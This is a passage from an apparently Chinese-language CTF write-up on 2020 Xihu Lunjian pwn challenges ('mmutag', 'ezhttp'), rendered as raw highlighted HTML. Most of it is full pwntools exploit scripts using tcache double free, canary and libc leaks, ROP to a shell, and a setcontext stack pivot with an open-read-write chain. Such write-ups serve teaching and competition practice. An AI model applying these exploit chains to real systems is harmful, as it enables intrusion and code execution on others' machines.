class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf0364</span><span class="token punctuation">,</span> <span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'183.129.189.62'</span><span class="token punctuation">,</span> <span class="token number">58704</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./mmutag"</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">myIntroduce</span><span class="token punctuation">(</span>introduce<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input your choice:\n\n"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your introduce \n"</span><span class="token punctuation">,</span> introduce<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input your choice:\n\n"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your id:\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your content\n"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your id:\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stackSend</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input your choice:\n\n"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400d23</span>pop_r12_r13_r14_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400d1c</span> <span class="token comment" spellcheck="true"># 0x0000000000400d1c: pop r12; pop r13; pop r14; pop r15; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input you name: \n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"blueSheep\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your tag: 0x"</span><span class="token punctuation">)</span>stack_address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_address<span class="token punctuation">)</span><span class="token punctuation">)</span>myIntroduce<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>stackSend<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x19</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token punctuation">(</span>canary <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>success<span class="token punctuation">(</span><span class="token string">"canary ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>stack_address <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">0</span><span class="token punctuation">,</span>canary<span class="token punctuation">,</span>stack_address<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>    pop_rdi_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_r12_r13_r14_r15_ret<span class="token punctuation">,</span>    elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>stack_address<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400d00</span><span class="token punctuation">]</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your choise:\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-ezhttp"><a href="#0x03-ezhttp" class="headerlink" title="0x03 ezhttp"></a>0x03 ezhttp</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/4.png"></div><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>这道题是一道模拟http请求的题目，功能参数都通过packet传递，同时一些验证字符也需要按照解析格式放在数据包内一并传递。需要耐心解析数据包格式，较繁琐。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/5.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/6.png"></div>最后检查密码的地方不用管，看汇编可以理解，result恒不为0。<p>数据格式大致是：</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token number">28</span>     payload <span class="token operator">=</span> <span class="token string">"POST "</span> <span class="token number">29</span>     payload<span class="token operator">+=</span> command <span class="token number">30</span>     payload<span class="token operator">+=</span> <span class="token string">" Cookie: "</span> <span class="token number">31</span>     payload<span class="token operator">+=</span> <span class="token string">"user"</span> <span class="token number">32</span>     payload<span class="token operator">+=</span> <span class="token string">"="</span> <span class="token number">33</span>     payload<span class="token operator">+=</span> <span class="token string">"admin"</span> <span class="token number">34</span>     payload<span class="token operator">+=</span> <span class="token string">"token: "</span> <span class="token number">35</span>     payload<span class="token operator">+=</span> <span class="token string">"\r\n\r\n"</span> <span class="token number">36</span>     payload<span class="token operator">+=</span> content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是三个功能：create、delete和edit。create会直接给出heap地址，free中有double free，没有show。这道题目开启了沙箱，只能考虑orw来获得flag。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/7.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/8.png"></div><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>double free劫持tcache pthread header，通过io来进行leak libc，然后改hook为setcontext+53劫持stack esp指针，之后会跳转到提前布置的rop中执行ORW来获得flag</p><p>由于create通过\x00来算size，所以我们需要分开写，第一次写flag，第二次写write_base</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ezhttp'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ezhttp'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># p = process('./ezhttp',env={'LD_PRELOAD':'./libc-2.27.so'})</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'183.129.189.61'</span><span class="token punctuation">,</span><span class="token number">51302</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">makePacket</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"POST "</span>    payload<span class="token operator">+=</span> command    payload<span class="token operator">+=</span> <span class="token string">" Cookie: "</span>    payload<span class="token operator">+=</span> <span class="token string">"user"</span>    payload<span class="token operator">+=</span> <span class="token string">"="</span>    payload<span class="token operator">+=</span> <span class="token string">"admin"</span>    payload<span class="token operator">+=</span> <span class="token string">"token: "</span>    payload<span class="token operator">+=</span> <span class="token string">"\r\n\r\n"</span>    payload<span class="token operator">+=</span> content    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">'a\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"content="</span>    payload <span class="token operator">+=</span> content    sendPacket<span class="token punctuation">(</span>makePacket<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"index="</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sendPacket<span class="token punctuation">(</span>makePacket<span class="token punctuation">(</span><span class="token string">"/del"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"index="</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">"&amp;content="</span>    payload <span class="token operator">+=</span> content    payload <span class="token operator">+=</span> <span class="token string">'\n'</span>    sendPacket<span class="token punctuation">(</span>makePacket<span class="token punctuation">(</span><span class="token string">"/edit"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sendPacket</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"======= Send Http packet to me: ========"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p,"b *0x555555554000+0xf9d")</span>create<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your gift: 0x"</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x260</span>success<span class="token punctuation">(</span><span class="token string">"heap base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token string">"e"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>create<span class="token punctuation">(</span><span class="token string">"\x07"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x07"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x370</span><span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>create<span class="token punctuation">(</span><span class="token string">"\x60\x07\xdd"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x07"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x370</span><span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>create<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1877</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 10  io_stdout->flag</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x07"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x370</span><span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x80\x07\xdd"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 11</span>create<span class="token punctuation">(</span><span class="token string">"a\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 12   io_stdout->write_base</span>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token number">131</span>success<span class="token punctuation">(</span><span class="token string">"libc adddress ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>syscall <span class="token operator">=</span> <span class="token number">0x00000000000d29d5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rax <span class="token operator">=</span> <span class="token number">0x43a78</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rsi <span class="token operator">=</span> <span class="token number">0x23e8a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rdi <span class="token operator">=</span> <span class="token number">0x2155f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rdx <span class="token operator">=</span> <span class="token number">0x1b96</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressedit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x07"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x52145</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x98</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x480</span><span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># esp</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"./flag\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x0000555555758590</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x590</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>                pop_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x5a0</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>                pop_rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rsi<span 